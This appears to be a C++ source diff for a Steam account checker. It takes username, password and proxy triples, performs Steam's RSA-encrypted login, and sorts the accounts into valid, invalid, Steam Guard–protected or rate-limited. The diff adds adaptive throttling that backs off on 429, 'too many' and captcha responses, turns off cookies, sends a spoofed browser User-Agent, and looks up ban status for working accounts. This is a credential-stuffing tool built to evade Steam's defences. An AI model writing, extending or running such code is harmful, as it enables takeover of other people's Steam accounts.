@@ -2,6 +2,8 @@
 #include "rsa.h"
 #include "jsonmini.h"
 #include "util.h"
+#include "throttle.h"
+#include "banparse.h"
 #include <windows.h>
 #include <winhttp.h>
 #include <string>
@@ -15,6 +17,13 @@
 
 #pragma comment(lib, "winhttp.lib")
 
+#ifndef WINHTTP_OPTION_DISABLE_FEATURES
+#define WINHTTP_OPTION_DISABLE_FEATURES 63
+#endif
+#ifndef WINHTTP_DISABLE_COOKIES
+#define WINHTTP_DISABLE_COOKIES 0x00000001
+#endif
+
 static std::wstring ToWide(const std::string& s) {
     if (s.empty()) return L"";
     int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
@@ -24,44 +33,13 @@ static std::wstring ToWide(const std::string& s) {
     return w;
 }
 
-static std::atomic<long long> g_nextAllowed{0};
-static std::atomic<long long> g_lastReq{0};
-static std::atomic<int> g_minInterval{250};
-static std::atomic<int> g_consecOk{0};
+static SteamThrottle g_thr;
+static std::atomic<bool> g_banCheck{true};
 
 namespace steamcheck {
-int CurrentMinInterval() { return g_minInterval.load(); }
-void ReportMinInterval(int ms) { g_minInterval.store(ms < 100 ? 100 : ms); }
-}
-
-static void GlobalThrottle() {
-    long long until = g_nextAllowed.load();
-    long long now = util::NowMs();
-    if (until > now)
-        std::this_thread::sleep_for(std::chrono::milliseconds((int)(until - now)));
-    long long last = g_lastReq.load();
-    now = util::NowMs();
-    int iv = g_minInterval.load();
-    if (last != 0 && now - last < iv) {
-        std::this_thread::sleep_for(std::chrono::milliseconds((int)(iv - (now - last))));
-    }
-    g_lastReq.store(util::NowMs());
-}
-
-static void OnRateLimit(int waitMs) {
-    g_nextAllowed.store(util::NowMs() + waitMs);
-    int cur = g_minInterval.load();
-    g_minInterval.store(cur + 350 > 5000 ? 5000 : cur + 350);
-    g_consecOk.store(0);
-}
-
-static void OnSuccess() {
-    int ok = g_consecOk.fetch_add(1) + 1;
-    if (ok >= 6) {
-        int cur = g_minInterval.load();
-        if (cur > 250) g_minInterval.store(cur - 100);
-        g_consecOk.store(2);
-    }
+int CurrentMinInterval() { return g_thr.CurrentInterval(); }
+void ReportMinInterval(int ms) { g_thr.SetBase(ms); }
+void SetBanCheck(bool on) { g_banCheck.store(on); }
 }
 
 struct RawResp {
@@ -142,6 +120,9 @@ public:
         }
         if (!m_h) return false;
         WinHttpSetTimeouts(m_h, 12000, 12000, 12000, 12000);
+        DWORD noCookies = WINHTTP_DISABLE_COOKIES;
+        WinHttpSetOption(m_h, WINHTTP_OPTION_DISABLE_FEATURES, &noCookies,
+                         sizeof(noCookies));
         m_alive = true;
         m_proxy = proxy;
         return true;
@@ -154,29 +135,45 @@ public:
 
     RawResp Post(const std::string& host, const std::string& path,
                  const std::string& body, const std::string& cookie) {
+        return Request(L"POST", host, path, body, cookie);
+    }
+
+    RawResp Get(const std::string& host, const std::string& path,
+                const std::string& cookie) {
+        return Request(L"GET", host, path, "", cookie);
+    }
+
+private:
+    RawResp Request(const wchar_t* verb, const std::string& host, const std::string& path,
+                   const std::string& body, const std::string& cookie) {
         RawResp r;
         if (!m_h) return r;
+        g_thr.WaitTurn();
         HINTERNET hConn = WinHttpConnect(m_h, ToWide(host).c_str(),
                                          INTERNET_DEFAULT_HTTPS_PORT, 0);
         if (!hConn) return r;
-        HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST", ToWide(path).c_str(),
+        HINTERNET hReq = WinHttpOpenRequest(hConn, verb, ToWide(path).c_str(),
                                             nullptr, WINHTTP_NO_REFERER,
                                             WINHTTP_DEFAULT_ACCEPT_TYPES,
                                             WINHTTP_FLAG_SECURE);
         if (!hReq) { WinHttpCloseHandle(hConn); return r; }
 
-        std::wstring hdr = L"Content-Type: application/x-www-form-urlencoded\r\n";
-        hdr += L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\r\n";
-        hdr += L"Accept: application/json, text/javascript, */*; q=0.01\r\n";
+        std::wstring hdr = L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\r\n";
+        hdr += L"Accept: text/html,application/json,*/*;q=0.01\r\n";
         hdr += L"Accept-Language: en-US,en;q=0.9\r\n";
-        hdr += L"Origin: https://steamcommunity.com\r\n";
-        hdr += L"Referer: https://steamcommunity.com/login/home/?goto=\r\n";
-        hdr += L"X-Requested-With: XMLHttpRequest\r\n";
+        if (wcscmp(verb, L"POST") == 0) {
+            hdr = L"Content-Type: application/x-www-form-urlencoded\r\n" + hdr;
+            hdr += L"Origin: https://steamcommunity.com\r\n";
+            hdr += L"Referer: https://steamcommunity.com/login/home/?goto=\r\n";
+            hdr += L"X-Requested-With: XMLHttpRequest\r\n";
+        }
         if (!cookie.empty()) hdr += L"Cookie: " + ToWide(cookie) + L"\r\n";
 
+        DWORD bodyLen = (DWORD)body.size();
+        if (body.empty()) bodyLen = 0;
         BOOL sent = WinHttpSendRequest(hReq, hdr.c_str(), (DWORD)-1,
-                                       (LPVOID)body.data(), (DWORD)body.size(),
-                                       (DWORD)body.size(), 0);
+                                       body.empty() ? nullptr : (LPVOID)body.data(),
+                                       bodyLen, bodyLen, 0);
         if (sent && WinHttpReceiveResponse(hReq, nullptr)) {
             DWORD st = 0, sz = sizeof(st);
             WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
@@ -231,7 +228,70 @@ private:
     std::string m_proxy;
 };
 
-static thread_local HttpSession tls_session;
+static BanInfo FetchBanInfo(HttpSession& session, const std::string& steamid) {
+    BanInfo bi;
+    if (steamid.empty() || steamid.size() < 10) return bi;
+    for (int attempt = 0; attempt < 2 && !bi.banned; attempt++) {
+        RawResp pr = session.Get("steamcommunity.com",
+                                 "/profiles/" + steamid + "?l=english", "");
+        if (!pr.ok || pr.body.empty()) {
+            std::this_thread::sleep_for(std::chrono::milliseconds(400));
+            continue;
+        }
+        bi = ParseBanHtml(pr.body);
+        if (bi.banned) break;
+    }
+    return bi;
+}
+
+static BanInfo FetchBanByName(HttpSession& session, const std::string& name) {
+    BanInfo bi;
+    if (name.empty()) return bi;
+    RawResp pr = session.Get("steamcommunity.com",
+                             "/id/" + name + "?l=english", "");
+    if (pr.ok && !pr.body.empty())
+        bi = ParseBanHtml(pr.body);
+    if (!bi.banned && pr.status >= 300 && pr.status < 400) {
+        std::this_thread::sleep_for(std::chrono::milliseconds(300));
+        RawResp xml = session.Get("steamcommunity.com",
+                                  "/id/" + name + "/?xml=1", "");
+        if (xml.ok && !xml.body.empty()) {
+            std::string sx = util::ToLower(xml.body);
+            size_t sp = sx.find("<steamid64>");
+            if (sp != std::string::npos) {
+                sp += 11;
+                size_t e = sx.find('<', sp);
+                if (e != std::string::npos && e - sp == 17) {
+                    std::string sid = xml.body.substr(sp, 17);
+                    bi = FetchBanInfo(session, sid);
+                }
+            }
+        }
+    }
+    return bi;
+}
+
+BanResult FetchBanBySteamId(const std::string& steamid) {
+    HttpSession session;
+    if (!session.Ensure("")) return BanResult{};
+    BanInfo bi = FetchBanInfo(session, steamid);
+    BanResult r;
+    r.ok = bi.banned;
+    r.ban = bi.text;
+    r.days = bi.days;
+    return r;
+}
+
+BanResult FetchBanByAccountName(const std::string& name) {
+    HttpSession session;
+    if (!session.Ensure("")) return BanResult{};
+    BanInfo bi = FetchBanByName(session, name);
+    BanResult r;
+    r.ok = bi.banned;
+    r.ban = bi.text;
+    r.days = bi.days;
+    return r;
+}
 
 static std::string MergeCookies(const std::string& oldC, const std::string& newC) {
     if (oldC.empty()) return newC;
@@ -268,30 +328,28 @@ static std::string MergeCookies(const std::string& oldC, const std::string& newC
 
 CheckOutcome CheckSteamAccount(const std::string& user, const std::string& pass,
                                const std::string& proxy) {
-    if (!tls_session.Ensure(proxy)) return {AccStatus::Error, "no session"};
+    HttpSession session;
+    if (!session.Ensure(proxy)) return {AccStatus::Error, "no session"};
 
-    GlobalThrottle();
-
-    thread_local std::string tls_cookieJar;
-    std::string cookie = tls_cookieJar;
+    std::string cookie;
 
     long long ts = util::NowMs();
     std::string b1 = "username=" + util::UrlEncode(user) +
                      "&donotcache=" + std::to_string(ts);
 
-    RawResp r1 = tls_session.Post("steamcommunity.com", "/login/getrsakey/", b1, cookie);
+    RawResp r1 = session.Post("steamcommunity.com", "/login/getrsakey/", b1, cookie);
     if (!r1.setCookie.empty())
-        tls_cookieJar = MergeCookies(tls_cookieJar, r1.setCookie);
+        cookie = MergeCookies(cookie, r1.setCookie);
     if (r1.status == 429) {
-        OnRateLimit(r1.retryAfterMs ? r1.retryAfterMs : 4500);
+        g_thr.ReportRateLimited(r1.retryAfterMs ? r1.retryAfterMs : 4500);
         return {AccStatus::RateLimited, "rate 429"};
     }
-    if (!r1.ok || r1.body.empty()) { tls_session.Close(); return {AccStatus::Error, "network"}; }
+    if (!r1.ok || r1.body.empty()) return {AccStatus::Error, "network"};
     if (!jsonmini::GetBool(r1.body, "success")) {
         std::string m = jsonmini::GetString(r1.body, "message");
         std::string ml = util::ToLower(m);
         if (ml.find("rate") != std::string::npos || ml.find("too many") != std::string::npos) {
-            OnRateLimit(3500);
+            g_thr.ReportRateLimited(3500);
             return {AccStatus::RateLimited, m};
         }
         return {AccStatus::Error, m.empty() ? "no rsakey" : m};
@@ -299,7 +357,7 @@ CheckOutcome CheckSteamAccount(const std::string& user, const std::string& pass,
     std::string mod = jsonmini::GetString(r1.body, "publickey_mod");
     std::string exp = jsonmini::GetString(r1.body, "publickey_exp");
     std::string stamp = jsonmini::GetString(r1.body, "timestamp");
-    if (mod.empty() || exp.empty()) return {AccStatus::Error, "bad key"};
+    if (mod.empty() || exp.empty() || stamp.empty()) return {AccStatus::Error, "bad key"};
     std::string enc = RsaEncryptPassword(mod, exp, pass);
     if (enc.empty()) return {AccStatus::Error, "crypto"};
 
@@ -309,42 +367,47 @@ CheckOutcome CheckSteamAccount(const std::string& user, const std::string& pass,
                      "&password=" + util::UrlEncode(enc) +
                      "&emailauth=&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=" +
                      "&rsatimestamp=" + stamp +
-                     "&remember_login=true&donotcache=" + std::to_string(util::NowMs());
+                     "&remember_login=false&donotcache=" + std::to_string(util::NowMs());
 
-    RawResp r2 = tls_session.Post("steamcommunity.com", "/login/dologin/", b2, cookie);
+    RawResp r2 = session.Post("steamcommunity.com", "/login/dologin/", b2, cookie);
 
     if (r2.status == 429) {
-        OnRateLimit(r2.retryAfterMs ? r2.retryAfterMs : 4500);
+        g_thr.ReportRateLimited(r2.retryAfterMs ? r2.retryAfterMs : 4500);
         return {AccStatus::RateLimited, "rate 429"};
     }
-    if (!r2.ok && r2.body.empty()) { tls_session.Close(); return {AccStatus::Error, "network"}; }
+    if (!r2.ok && r2.body.empty()) return {AccStatus::Error, "network"};
+
+    std::string sid = ExtractSteamId(r2.body);
+    BanInfo bi;
+    if (!sid.empty() && g_banCheck.load())
+        bi = FetchBanInfo(session, sid);
 
     if (jsonmini::GetBool(r2.body, "success")) {
-        OnSuccess();
-        return {AccStatus::Valid, ""};
+        g_thr.ReportSuccess();
+        return {AccStatus::Valid, "", sid, bi.text, bi.days};
     }
     if (jsonmini::GetBool(r2.body, "emailauth_needed") ||
-        jsonmini::GetBool(r2.body, "requires_twofactor"))
-        return {AccStatus::Guard, "steamguard"};
+        jsonmini::GetBool(r2.body, "requires_twofactor")) {
+        return {AccStatus::Guard, "steamguard", sid, bi.text, bi.days};
+    }
 
     std::string msg = jsonmini::GetString(r2.body, "message");
     std::string low = util::ToLower(msg);
 
     if (jsonmini::GetBool(r2.body, "captcha_needed")) {
-        OnRateLimit(3500);
+        g_thr.ReportRateLimited(3500);
         return {AccStatus::RateLimited, "captcha"};
     }
     if (low.find("rate") != std::string::npos ||
         low.find("too many") != std::string::npos ||
         low.find("try again") != std::string::npos ||
         low.find("temporarily") != std::string::npos) {
-        OnRateLimit(3500);
+        g_thr.ReportRateLimited(3500);
         return {AccStatus::RateLimited, msg};
     }
     if (msg.empty()) {
         if (r2.body.find("incorrect") != std::string::npos)
             return {AccStatus::Invalid, "incorrect"};
-        tls_session.Close();
         return {AccStatus::Error, "empty"};
     }
     return {AccStatus::Invalid, msg};
